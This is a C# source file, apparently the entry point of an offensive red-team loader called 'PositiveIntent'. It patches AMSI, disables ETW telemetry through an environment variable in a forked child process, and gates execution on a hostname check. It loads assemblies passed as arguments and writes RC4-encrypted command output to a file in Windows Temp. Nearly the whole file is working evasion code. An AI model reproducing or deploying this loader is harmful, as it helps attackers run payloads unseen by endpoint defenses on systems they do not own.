using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Text;

namespace PositiveIntent
{
    public class Program
    {
        private static bool GetParentProcess()
        {
            int parentPid = 0;
            int ourPid = Process.GetCurrentProcess().Id;
            using (ManagementObject mo = new ManagementObject("win32_process.handle='" + ourPid.ToString() + "'"))
            {
                mo.Get();
                parentPid = Convert.ToInt32(mo["ParentProcessId"]);
            }
            if (Process.GetProcessById(parentPid).ProcessName == Process.GetCurrentProcess().ProcessName)
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        private static void CheckHostname()
        {
            if (Environment.MachineName != "TESTVM") // placeholder
            {
                Environment.Exit(-1);
            }
        }

        private static void Fork(string args, bool shouldWriteToFile = false)
        {
            Process p = new Process();
            p.StartInfo.FileName = Process.GetCurrentProcess().ProcessName;
            p.StartInfo.Arguments = args;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.EnvironmentVariables["COMPlus_ETWEnabled"] = "0"; // neuter ETW
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.Start();

            if(shouldWriteToFile)
            {
                RC4 rc4 = new RC4(RC4.key);

                byte[] encryptedStdOutBytes = rc4.EncryptDecrypt(Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd()));
                byte[] encryptedStdErrBytes = rc4.EncryptDecrypt(Encoding.UTF8.GetBytes(p.StandardError.ReadToEnd()));
                byte[] combinedBytes = new byte[encryptedStdOutBytes.Length + encryptedStdErrBytes.Length];

                Array.Copy(encryptedStdOutBytes, combinedBytes, encryptedStdOutBytes.Length);
                Array.Copy(encryptedStdErrBytes, 0, combinedBytes, encryptedStdOutBytes.Length, encryptedStdErrBytes.Length);

                File.WriteAllBytes("C:\\Windows\\Temp\\log.txt", combinedBytes);
            }
            else
            {
                Console.WriteLine(p.StandardOutput.ReadToEnd());
                Console.WriteLine(p.StandardError.ReadToEnd());
            }

            p.WaitForExit();
        }

        public static void Main(string[] args)
        {
            try
            {
                if (GetParentProcess())
                {
                    AMSI.Patch();
                    AssemblyHelper.LoadAssembly(args);
                }
                else if (args.Length != 0)
                {
                    CheckHostname();
                    Fork(string.Join(" ", args)); // placeholder
                }
            }
            // Need to improve exception handling both globally and locally - handle some exceptions locally if recoverable
            catch (Exception ex)
            {
                Console.WriteLine("\nSomething has gone terribly wrong.\n");
                Console.WriteLine(ex.ToString());
            }
        }
    }
}
